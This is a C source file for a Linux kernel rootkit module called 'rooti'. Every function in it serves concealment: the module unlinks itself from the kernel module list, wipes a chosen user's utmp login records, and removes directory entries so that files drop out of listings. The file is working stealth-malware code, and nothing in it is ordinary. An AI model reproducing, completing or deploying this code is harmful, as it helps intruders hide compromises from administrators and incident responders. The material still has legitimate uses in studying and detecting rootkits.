#include <linux/module.h>
#include <linux/types.h>
#include <linux/dirent.h>
#include "utmp.h"
#include "hide.h"

/* 
 * Indicates whether the rootkit is missing from the list of kernel modules (e.g is hidden).
 * When hidden, the variable prev_module stores the address of the node that was previously
 * before this module in the list, otherwise it is NULL.
*/
bool rooti_hidden = false;
static struct list_head *prev_module = NULL;

/*
    Hides this rootkit by removing it from the kernel modules list.
*/
void rooti_hideme()
{
    rooti_hidden = true;
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

/*
    Reveals this rootkit by re-adding it to the kernel modules list.
*/
void rooti_showme()
{
    rooti_hidden = false;
    list_add(&THIS_MODULE->list, prev_module);
    prev_module = NULL;
}

int rooti_filter_login_entry(char *user_buf, size_t count, char *name)
{
    char *kernel_buf = kmalloc(count, GFP_KERNEL);
    if (kernel_buf == NULL) {
        printk(KERN_DEBUG "rooti: failed to allocate memory\n");
        return -ENOMEM;
    }
    int err = copy_from_user(kernel_buf, user_buf, count);
    if (err > 0) {
        printk(KERN_DEBUG "rooti: copy_from_user() failed\n");
        kfree(kernel_buf);
        return -EFAULT;
    }

    struct utmp *utmp_buf = (struct utmp *)kernel_buf;
    if (strncmp(utmp_buf->ut_user, name, UT_NAMESIZE) == 0) {
        // Match found, fill the buffer with zeros, marking it as invalid
        memset(kernel_buf, 0, count);
        err = copy_to_user(user_buf, kernel_buf, count);
        if (err > 0) {
            printk(KERN_DEBUG "rooti: copy_to_user() failed\n");
            kfree(kernel_buf);
            return -EFAULT;
        }
    }

    kfree(kernel_buf);
    return 0;
}

size_t rooti_filter_dir_entry(struct linux_dirent64 *curr_record, struct linux_dirent64 *prev_record, size_t count)
{
    // Special case where the record to hide is the first one
    if (prev_record == NULL) {
        // Shift the entire buffer to override the first record
        count -= curr_record->d_reclen;
        memmove(curr_record, (void *)curr_record + curr_record->d_reclen, count);
    } else {
        // Increase the size of previous record to override the current record
        prev_record->d_reclen += curr_record->d_reclen;
    }
    return count;
}